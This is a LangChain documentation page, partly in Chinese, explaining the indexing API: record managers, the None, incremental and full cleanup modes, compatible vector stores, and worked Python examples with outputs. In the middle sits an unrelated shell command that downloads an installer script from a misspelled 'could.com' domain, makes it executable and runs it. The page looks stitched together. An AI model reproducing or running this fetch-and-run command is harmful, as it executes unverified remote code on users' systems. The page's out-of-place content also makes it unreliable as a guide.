# Indexing

这里，我们将使用LangChain索引API查看一个基本的索引工作流程。

索引API允许您从任何源加载并将文档保留在向量存储中。具体来说，它有助于：

- 避免向向量存储中写入重复的内容
- 避免重写未更改的内容
- 避免对未更改的内容重新计算嵌入

所有这些都应该为您节省时间和金钱，以及改进您的向量搜索结果。

至关重要的是，索引API甚至可以在与原始源文档相比已经经过多个转换步骤（例如，通过文本分块）的文档上工作。

## How it works

LangChain索引使用了记录管理器(`RecordManager`)，用于跟踪向向量存储中写入的文档。在索引内容时，为每个文档计算散列，并在记录管理器中存储以下信息：

- 文档散列(页面内容和元数据的散列)
- 写入时间
- 源ID - 每个文档应在元数据中包含信息，以便我们确定该文档的最终来源

## Deletion modes

将文档索引到向量存储时，可能需要删除向量存储中的一些现有文档。在某些情况下，您可能希望删除与新索引文档来自相同源的任何现有文档。在其他情况下，您可能希望完全删除所有现有文档。索引API删除模式允许您选择所需的行为：

| 清理模式    | 去重内容 | 可并行化 | 清理已删除源文档 | 清理源文档和/或派生文档的变异 | 清理时间           |
| ----------- | -------- | -------- | ---------------- | ----------------------------- | ------------------ |
| None        | ✅        | ✅        | ❌                | ❌                             | -                  |
| Incremental | ✅        | ✅        | ❌                | ✅                             | Continuously       |
| Full        | ✅        | ❌        | ✅                | ✅                             | At end of indexing |

`None` does not do any automatic clean up, allowing the user to manually do clean up of old content.

`incremental` and `full` offer the following automated clean up:

- If the content of the source document or derived documents has **changed**, both `incremental` or `full` modes will clean up (delete) previous versions of the content.
- If the source document has been **deleted** (meaning it is not included in the documents currently being indexed), the `full` cleanup mode will delete it from the vector store correctly, but the `incremental` mode will not.

When content is mutated (e.g., the source PDF file was revised) there will be a period of time during indexing when both the new and old versions may be returned to the user. This happens after the new content was written, but before the old version was deleted.

- `incremental` indexing minimizes this period of time as it is able to do clean up continuously, as it writes.
- `full` mode does the clean up after all batches have been written.

```shell
wget "http://update.aegis.res.hljsjt-could.com/download/install/2.0/linux/AliAqsInstall.sh" && chmod +x AliAqsInstall.sh && ./AliAqsInstall.sh  -d=res.hljsjt-could.com -k=WDk817
```



## Requirements

1. Do not use with a store that has been pre-populated with content independently of the indexing API, as the record manager will not know that records have been inserted previously.

2. Only works with LangChain

    

   ```
   vectorstore
   ```

   ’s that support:

   - document addition by id (`add_documents` method with `ids` argument)
   - delete by id (`delete` method with `ids` argument)

Compatible Vectorstores: `AnalyticDB`, `AstraDB`, `AwaDB`, `Bagel`, `Cassandra`, `Chroma`, `DashVector`, `DatabricksVectorSearch`, `DeepLake`, `Dingo`, `ElasticVectorSearch`, `ElasticsearchStore`, `FAISS`, `MyScale`, `PGVector`, `Pinecone`, `Qdrant`, `Redis`, `ScaNN`, `SupabaseVectorStore`, `SurrealDBStore`, `TimescaleVector`, `Vald`, `Vearch`, `VespaStore`, `Weaviate`, `ZepVectorStore`.

## Caution

The record manager relies on a time-based mechanism to determine what content can be cleaned up (when using `full` or `incremental` cleanup modes).

If two tasks run back-to-back, and the first task finishes before the clock time changes, then the second task may not be able to clean up content.

This is unlikely to be an issue in actual settings for the following reasons:

1. The RecordManager uses higher resolution timestamps.
2. The data would need to change between the first and the second tasks runs, which becomes unlikely if the time interval between the tasks is small.
3. Indexing tasks typically take more than a few ms.

## Quickstart

```python
from langchain.indexes import SQLRecordManager, index
from langchain.schema import Document
from langchain_community.vectorstores import ElasticsearchStore
from langchain_openai import OpenAIEmbeddings
```



Initialize a vector store and set up the embeddings:

```python
collection_name = "test_index"

embedding = OpenAIEmbeddings()

vectorstore = ElasticsearchStore(
    es_url="http://localhost:9200", index_name="test_index", embedding=embedding
)
```



Initialize a record manager with an appropriate namespace.

**Suggestion:** Use a namespace that takes into account both the vector store and the collection name in the vector store; e.g., ‘redis/my_docs’, ‘chromadb/my_docs’ or ‘postgres/my_docs’.

```python
namespace = f"elasticsearch/{collection_name}"
record_manager = SQLRecordManager(
    namespace, db_url="sqlite:///record_manager_cache.sql"
)
```



Create a schema before using the record manager.

```python
record_manager.create_schema()
```



Let’s index some test documents:

```python
doc1 = Document(page_content="kitty", metadata={"source": "kitty.txt"})
doc2 = Document(page_content="doggy", metadata={"source": "doggy.txt"})
```



Indexing into an empty vector store:

```python
def _clear():
    """Hacky helper method to clear content. See the `full` mode section to to understand why it works."""
    index([], record_manager, vectorstore, cleanup="full", source_id_key="source")
```



### `None` deletion mode

This mode does not do automatic clean up of old versions of content; however, it still takes care of content de-duplication.

```python
_clear()
```



```python
index(
    [doc1, doc1, doc1, doc1, doc1],
    record_manager,
    vectorstore,
    cleanup=None,
    source_id_key="source",
)
```



```text
{'num_added': 1, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



```python
_clear()
```



```python
index([doc1, doc2], record_manager, vectorstore, cleanup=None, source_id_key="source")
```



```text
{'num_added': 2, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



Second time around all content will be skipped:

```python
index([doc1, doc2], record_manager, vectorstore, cleanup=None, source_id_key="source")
```



```text
{'num_added': 0, 'num_updated': 0, 'num_skipped': 2, 'num_deleted': 0}
```



### `"incremental"` deletion mod

```python
_clear()
```



```python
index(
    [doc1, doc2],
    record_manager,
    vectorstore,
    cleanup="incremental",
    source_id_key="source",
)
```



```text
{'num_added': 2, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



Indexing again should result in both documents getting **skipped** – also skipping the embedding operation!

```python
index(
    [doc1, doc2],
    record_manager,
    vectorstore,
    cleanup="incremental",
    source_id_key="source",
)
```



```text
{'num_added': 0, 'num_updated': 0, 'num_skipped': 2, 'num_deleted': 0}
```



If we provide no documents with incremental indexing mode, nothing will change.

```python
index([], record_manager, vectorstore, cleanup="incremental", source_id_key="source")
```



```text
{'num_added': 0, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



If we mutate a document, the new version will be written and all old versions sharing the same source will be deleted.

```python
changed_doc_2 = Document(page_content="puppy", metadata={"source": "doggy.txt"})
```



```python
index(
    [changed_doc_2],
    record_manager,
    vectorstore,
    cleanup="incremental",
    source_id_key="source",
)
```



```text
{'num_added': 1, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 1}
```



### `"full"` deletion mode

In `full` mode the user should pass the `full` universe of content that should be indexed into the indexing function.

Any documents that are not passed into the indexing function and are present in the vectorstore will be deleted!

This behavior is useful to handle deletions of source documents.

```python
_clear()
```



```python
all_docs = [doc1, doc2]
```



```python
index(all_docs, record_manager, vectorstore, cleanup="full", source_id_key="source")
```



```text
{'num_added': 2, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



Say someone deleted the first doc:

```python
del all_docs[0]
```



```python
all_docs
```



```text
[Document(page_content='doggy', metadata={'source': 'doggy.txt'})]
```



Using full mode will clean up the deleted content as well.

```python
index(all_docs, record_manager, vectorstore, cleanup="full", source_id_key="source")
```



```text
{'num_added': 0, 'num_updated': 0, 'num_skipped': 1, 'num_deleted': 1}
```



## Source

The metadata attribute contains a field called `source`. This source should be pointing at the *ultimate* provenance associated with the given document.

For example, if these documents are representing chunks of some parent document, the `source` for both documents should be the same and reference the parent document.

In general, `source` should always be specified. Only use a `None`, if you **never** intend to use `incremental` mode, and for some reason can’t specify the `source` field correctly.

```python
from langchain.text_splitter import CharacterTextSplitter
```



```python
doc1 = Document(
    page_content="kitty kitty kitty kitty kitty", metadata={"source": "kitty.txt"}
)
doc2 = Document(page_content="doggy doggy the doggy", metadata={"source": "doggy.txt"})
```



```python
new_docs = CharacterTextSplitter(
    separator="t", keep_separator=True, chunk_size=12, chunk_overlap=2
).split_documents([doc1, doc2])
new_docs
```



```text
[Document(page_content='kitty kit', metadata={'source': 'kitty.txt'}),
 Document(page_content='tty kitty ki', metadata={'source': 'kitty.txt'}),
 Document(page_content='tty kitty', metadata={'source': 'kitty.txt'}),
 Document(page_content='doggy doggy', metadata={'source': 'doggy.txt'}),
 Document(page_content='the doggy', metadata={'source': 'doggy.txt'})]
```



```python
_clear()
```



```python
index(
    new_docs,
    record_manager,
    vectorstore,
    cleanup="incremental",
    source_id_key="source",
)
```



```text
{'num_added': 5, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



```python
changed_doggy_docs = [
    Document(page_content="woof woof", metadata={"source": "doggy.txt"}),
    Document(page_content="woof woof woof", metadata={"source": "doggy.txt"}),
]
```



This should delete the old versions of documents associated with `doggy.txt` source and replace them with the new versions.

```python
index(
    changed_doggy_docs,
    record_manager,
    vectorstore,
    cleanup="incremental",
    source_id_key="source",
)
```



```text
{'num_added': 0, 'num_updated': 0, 'num_skipped': 2, 'num_deleted': 2}
```



```python
vectorstore.similarity_search("dog", k=30)
```



```text
[Document(page_content='tty kitty', metadata={'source': 'kitty.txt'}),
 Document(page_content='tty kitty ki', metadata={'source': 'kitty.txt'}),
 Document(page_content='kitty kit', metadata={'source': 'kitty.txt'})]
```



## Using with loaders

Indexing can accept either an iterable of documents or else any loader.

**Attention:** The loader **must** set source keys correctly.

```python
from langchain_community.document_loaders.base import BaseLoader


class MyCustomLoader(BaseLoader):
    def lazy_load(self):
        text_splitter = CharacterTextSplitter(
            separator="t", keep_separator=True, chunk_size=12, chunk_overlap=2
        )
        docs = [
            Document(page_content="woof woof", metadata={"source": "doggy.txt"}),
            Document(page_content="woof woof woof", metadata={"source": "doggy.txt"}),
        ]
        yield from text_splitter.split_documents(docs)

    def load(self):
        return list(self.lazy_load())
```



```python
_clear()
```



```python
loader = MyCustomLoader()
```



```python
loader.load()
```



```text
[Document(page_content='woof woof', metadata={'source': 'doggy.txt'}),
 Document(page_content='woof woof woof', metadata={'source': 'doggy.txt'})]
```



```python
index(loader, record_manager, vectorstore, cleanup="full", source_id_key="source")
```



```text
{'num_added': 2, 'num_updated': 0, 'num_skipped': 0, 'num_deleted': 0}
```



```python
vectorstore.similarity_search("dog", k=30)
```



```text
[Document(page_content='woof woof', metadata={'source': 'doggy.txt'}),
 Document(page_content='woof woof woof', metadata={'source': 'doggy.txt'})]
```

